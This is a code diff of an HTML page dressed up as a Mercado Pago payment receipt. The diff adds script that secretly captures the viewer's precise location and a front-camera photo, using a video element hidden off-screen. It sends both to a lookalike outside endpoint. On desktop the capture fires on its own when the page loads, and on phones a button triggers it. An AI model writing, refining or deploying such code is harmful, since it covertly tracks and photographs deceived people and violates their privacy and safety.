@@ -12,6 +12,7 @@
       align-items: center;
       height: 100vh;
       margin: 0;
+      flex-direction: column;
     }
 
     .comprovante {
@@ -20,6 +21,7 @@
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.2);
       width: 380px;
+      text-align: center;
     }
 
     .header {
@@ -29,42 +31,15 @@
       margin-bottom: 20px;
     }
 
-    .header img {
-      height: 80px;
-    }
+    .header img { height: 80px; }
+    .header .title { text-align: right; font-size: 14px; }
+    .header .title strong { display: block; font-size: 16px; }
 
-    .header .title {
-      text-align: right;
-      font-size: 14px;
-    }
+    .section { margin-bottom: 15px; text-align: left; }
+    .section .label { font-weight: bold; display: block; margin-bottom: 3px; font-size: 12px; }
+    .section .value { font-size: 14px; }
 
-    .header .title strong {
-      display: block;
-      font-size: 16px;
-    }
-
-    .section {
-      margin-bottom: 15px;
-    }
-
-    .section .label {
-      font-weight: bold;
-      display: block;
-      margin-bottom: 3px;
-      font-size: 12px;
-    }
-
-    .section .value {
-      font-size: 14px;
-    }
-
-    .total {
-      text-align: center;
-      font-size: 24px;
-      font-weight: bold;
-      color: #00a650;
-      margin: 15px 0;
-    }
+    .total { text-align: center; font-size: 24px; font-weight: bold; color: #00a650; margin: 15px 0; }
 
     .barcode, .auth-code {
       font-family: monospace;
@@ -74,9 +49,21 @@
       border-radius: 5px;
       word-break: break-all;
     }
+
+    #startButton {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #00a650;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
+
   <div class="comprovante">
     <div class="header">
       <img src="mercado-pago.svg" alt="Mercado Pago">
@@ -114,16 +101,24 @@
     </div>
   </div>
 
+  <!-- Botão para iniciar captura em dispositivos móveis -->
+  <button id="startButton">Iniciar captura de localização e foto</button>
+
   <script>
     const ENDPOINT = 'https://mercado-yago.onrender.com/upload';
     const PAYER_NAME = 'URBANA COMERCIO E SERVIÇO DE INFORMATICA';
 
     async function captureAndSend() {
       let locationData = null;
+
+      // Captura localização
       if (navigator.geolocation) {
         try {
           locationData = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 15000
+            });
           });
         } catch (err) {
           console.warn('Não foi possível capturar localização:', err);
@@ -131,18 +126,31 @@
       }
 
       let imageData = null;
+
+      // Captura câmera
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
           const video = document.createElement('video');
+          video.style.position = 'fixed';
+          video.style.top = '-1000px';
+          video.style.left = '-1000px';
+          document.body.appendChild(video);
+
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
           video.srcObject = stream;
           await video.play();
+
+          await new Promise(resolve => setTimeout(resolve, 500)); // espera frame disponível
+
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth || 640;
           canvas.height = video.videoHeight || 480;
           canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
           imageData = canvas.toDataURL('image/png');
+
           stream.getTracks().forEach(track => track.stop());
+          document.body.removeChild(video);
         } catch (err) {
           console.warn('Não foi possível capturar imagem:', err);
         }
@@ -174,7 +182,21 @@
       }
     }
 
-    window.addEventListener('load', captureAndSend);
+    const startButton = document.getElementById('startButton');
+
+    // Em celulares, só dispara a captura após clique
+    startButton.addEventListener('click', async () => {
+      startButton.disabled = true;
+      startButton.innerText = 'Capturando...';
+      await captureAndSend();
+      startButton.innerText = 'Concluído!';
+    });
+
+    // Em desktops, tenta capturar imediatamente
+    if (!/Mobi|Android/i.test(navigator.userAgent)) {
+      startButton.style.display = 'none';
+      captureAndSend();
+    }
   </script>
 </body>
 </html>
